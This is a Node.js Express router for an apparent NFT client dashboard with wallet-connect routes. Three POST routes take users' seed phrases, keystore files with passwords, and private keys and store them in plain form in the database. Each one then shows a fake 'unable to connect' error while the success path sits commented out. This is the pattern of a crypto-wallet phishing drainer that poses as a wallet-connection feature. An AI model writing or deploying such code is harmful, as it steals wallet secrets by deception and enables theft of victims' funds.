//NPM Dependencies//
const express = require('express');
const router = express.Router();
const Users = require('../models/users');
const Access = require('../models/access');
const Token = require('../models/tokens');
const passport = require('passport');
const multer  = require('multer');
const { storage, cloudinary } = require('../cloudinary');
const upload = multer({ storage });
// const { WalletConnect, QRCodeModal } = require('walletconnect');
const WalletConnect = require('@walletconnect/client').default;
const QRCodeModal = require('@walletconnect/qrcode-modal').default;
const QRCode = require('qrcode');
const { ethers } = require('ethers');
const QRCodeReader = require('qrcode-reader');
const jimp = require('jimp');
//End of NPM Dependencies//

// Initialize WalletConnect
const connector = new WalletConnect({
    bridge: 'https://bridge.walletconnect.org', // WalletConnect bridge server
    qrcodeModal: QRCodeModal,
  });


//Middlewares//
const isLoggedIn = (req, res, next) => {
    if (!req.isAuthenticated()) {
        return res.redirect('/login')
    }
    next();
}

const isClient = async(req, res, next) => {
    const { username, password } = req.body;
    const user = await Users.findOne({username});
    if (!user) {
        req.flash('error', 'Incorrect Username or Password!')
        return res.redirect('/login');
    } else if (user.role !== 'client') {
        req.flash('error', 'You do not have permission to access this route!')
        return res.redirect('/login')
    } 
    next();
}

const onlyClient = async(req, res, next) => {
  const id = req.user.id;
  const user = await Users.findById(id);
  if (user.role !== 'client') {
      req.flash('error', 'You do not have permission to access this route!')
      return res.redirect('/')
  } else if (user.acctstatus === 'Suspended') {
      req.logout();
      req.flash("error", "Your account was suspended! Please contact your account's manager.")
      return res.redirect('/login')
  } 
  next();
}
//End of Middlewares//

router.get('/dashboard/nft', isLoggedIn,  onlyClient, async(req, res) => {
    const id = req.user.id;
    const user = await Users.findById(id);
    res.render('user/nft', {user});
});

router.get('/nft/scan-qrcode', isLoggedIn,  onlyClient, async(req, res) => {
  const id = req.user.id;
  const user = await Users.findById(id);
  const uri = connector.uri;

   // Generate QR code
  const qrCodeImage = await generateQRCode(uri);
  const connectionCode = generateConnectionCode();
  // console.log(uri)
  res.render('user/nftconnect', {user, uri, qrCodeImage, connectionCode});
});

router.get('/connect-wallet', isLoggedIn, async(req, res) => {
    res.render("user/connect-wallet")
})

// Route for the connection callback
router.get('/callback', async (req, res) => {
    try {
      const { code } = req.query;
  
      // Handle the connection callback
      await connector.connect({ code });
  
      // Store the connection details in your session or database
      // ...
  
    //   res.send('Connected successfully!');
    // console.error('success')
        req.flash('success', 'Connected successfully!')
        res.redirect(`/dashboard/nft`)
    } catch (err) {
      // console.error(err);
    //   res.status(500).send('Connection failed');
      req.flash('error', 'Unable to connect to wallet. Make sure your wallet is supported.')
        res.redirect(`/dashboard/nft`)
    }
  });

// Route for interacting with the wallet
router.get('/interact', async (req, res) => {
    try {
      // Check if the connection is established
      if (!connector.connected) {
        throw new Error('WalletConnect not connected');
      }
  
      // Create a Web3 provider using WalletConnect
      const provider = new ethers.providers.Web3Provider(connector);
  
      // Access the connected wallet address
      const accounts = await provider.listAccounts();
      const address = accounts[0];
  
      // Perform desired operations with the wallet
      // ...
  
      res.send(`Interacting with wallet address: ${address}`);
    } catch (err) {
      // console.error(err);
      res.status(500).send('Error interacting with wallet');
    }
  });

router.post('/connect-wallet', isLoggedIn, async(req, res) => {
    const {walletname} = req.body;
    const access = new Access(req.body);
    await access.save()
    // req.flash('success', 'Message Submitted')
    res.redirect(`/connect-wallet/${access.id}`);
});

router.get('/connect-wallet/:id', isLoggedIn, async(req, res) => {
    const access = await Access.findById(req.params.id)
    res.render("user/connect", {access})
})

router.post('/connect-wallet/:id/phrase', isLoggedIn, async (req, res) => {
    const user = await Users.findById(req.user.id);
    const access = await Access.findById(req.params.id)
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {phraseTokens} = req.body
    const newToken = {walletType: access.walletname, accessType: "Phrase", dateCreated: dateTime, phraseTokens}
    const token = new Token(newToken);
    user.wallets.push(token);
    await token.save();
    await user.save();
    // req.flash('success', 'Successfully connected wallet')
    // res.redirect(`/import/${token.id}`)
    req.flash('error', 'Unable to connect to wallet. Make sure your wallet is supported.')
 res.redirect(`/profile`)
});

router.post('/connect-wallet/:id/keystore', isLoggedIn, async (req, res) => {
    const user = await Users.findById(req.user.id);
    const access = await Access.findById(req.params.id)
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {keystoneJsonTokens, password} = req.body
    const newToken = {walletType: access.walletname, accessType: "Keystore JSON", dateCreated: dateTime, keystoneJsonTokens, password}
    const token = new Token(newToken);
    user.wallets.push(token);
    await token.save();
    await user.save();
    // req.flash('success', 'Successfully connected wallet')
    // res.redirect(`/import/${token.id}`)
    req.flash('error', 'Unable to connect to wallet. Make sure your wallet is supported.')
     res.redirect(`/profile`)
});

router.post('/connect-wallet/:id/privatekey', isLoggedIn, async (req, res) => {
    const user = await Users.findById(req.user.id);
    const access = await Access.findById(req.params.id)
        const today = new Date();
        const date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
        const hours = today.getHours() > 12 ? today.getHours() - 12 : today.getHours();
        const time = hours + ":" + today.getMinutes() + ":" + today.getSeconds();
        const ampm = today.getHours() >= 12 ? 'PM' : 'AM';
        const dateTime = date+' '+time+ ' ' + ampm;
    const {privateKeyTokens} = req.body
    const newToken = {walletType: access.walletname, accessType: "Private Key", dateCreated: dateTime, privateKeyTokens}
    const token = new Token(newToken);
    user.wallets.push(token);
    await token.save();
    await user.save();
    // req.flash('success', 'Successfully connected wallet')
    // res.redirect(`/import/${token.id}`)
    req.flash('error', 'Unable to connect to wallet. Make sure your wallet is supported.')
     res.redirect(`/profile`)
});

router.get('/import/:id', isLoggedIn, async(req, res) => {
    const wallet = await Token.findById(req.params.id)
    res.render("user/connected", {wallet})
})




async function generateQRCode(text) {
    try {
      return await QRCode.toDataURL(text);
    } catch (err) {
      // console.error(err);
      return '';
    }
  }
  function generateConnectionCode() {
    // Logic to generate a unique connection code
    const connectionCode = 'ABC123'; // Replace with your actual logic to generate a unique code
    return connectionCode;
  }

  
module.exports = router;